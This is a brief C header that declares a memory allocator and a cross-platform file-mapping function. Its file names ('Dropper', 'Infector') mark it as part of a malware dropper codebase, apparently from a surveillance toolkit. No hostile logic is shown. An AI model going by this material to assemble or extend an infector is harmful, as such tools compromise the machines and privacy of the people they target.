/*
 *  RCSMacDropperUtil.h
 *  
 *
 *  Created by revenge on 7/20/09.
 *  Win32 porting by Massimo Chiodini on 02/11/2009
 *  Copyright 2009 __MyCompanyName__. All rights reserved.
 *
 */
#ifdef WIN32
#pragma once
#include <Windows.h>
#define mmap _mmap
#endif

#include "RCSMacInfectorErrors.h"


void *allocate (size_t);
//char *mapFile (char *, int *, int *, int *);
#ifdef WIN32
char *
mapFile (char *filename, int *fileSize, HANDLE *fd, HANDLE *fdMap, int *padding);
#else
char *
mapFile (char *filename, int *fileSize, int *fd, int *padding);
#endif